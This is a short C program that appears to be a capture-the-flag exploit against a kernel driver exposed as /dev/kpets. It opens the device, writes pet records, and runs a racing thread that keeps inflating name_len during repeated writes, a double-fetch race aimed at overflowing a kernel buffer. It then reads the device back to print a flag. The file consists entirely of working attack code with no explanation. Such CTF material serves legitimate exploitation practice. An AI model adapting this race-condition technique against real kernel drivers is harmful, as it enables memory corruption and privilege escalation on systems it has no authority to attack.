#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#define NUM_TRIALS 20

struct pet_buffer {
    char pet_type;
    char unused[3];
    unsigned int name_len;
    char name[0x20];
    unsigned int desc_len;
    char desc[0x40];
};

struct pet_buffer pet[2];

pthread_t racer;

void racing_thread(){
    while(1) {
        pet[0].name_len = (sizeof pet[0])*2;
    }

}

char *name = "somename";
char *desc = "somedescription";

int main (int argc, char **argv) {

    char buf[0x100];
    memset (buf, 0, sizeof buf);

    int fd = open("/dev/kpets",O_RDWR);
    if (fd < 0) {
        perror("open");
    }

    /* create a normal pet entry */
    pet[0].pet_type = 0xC2;
    pet[0].name_len = strlen(name);
    pet[0].desc_len = strlen(desc);
    strcpy(pet[0].name, name);
    strcpy(pet[0].desc, desc);

    /* malicious pet entry */
    pet[1].pet_type = 0xAA;
    pet[1].name_len = strlen("MALICIOUS NAME");
    pet[1].desc_len = strlen("MALICIOUS DISC");
    strcpy(pet[1].name, "MALICIOUS NAME");
    strcpy(pet[1].desc, "MALICIOUS DISC");


    if (write(fd,&pet[0],sizeof(pet[0]))<0) {
        perror("write");
    }

    printf("pet %s created\n",name);

    pthread_create(&racer, NULL, &racing_thread, NULL);

    /* race */
    
    for(int i = 0; i < NUM_TRIALS; i++) {
        pet[0].name_len = 0x20;
        if (write(fd,&pet[0],sizeof(pet[0]))<0) {
            perror("write");
        }
        printf("pet %d created\n",i);
    }
    

    /* check result */
    if (read(fd,buf,0x29) == -14){
        printf("succeeded in getting the flag, the flag is %s\n",buf);
    }

    return 0;
}
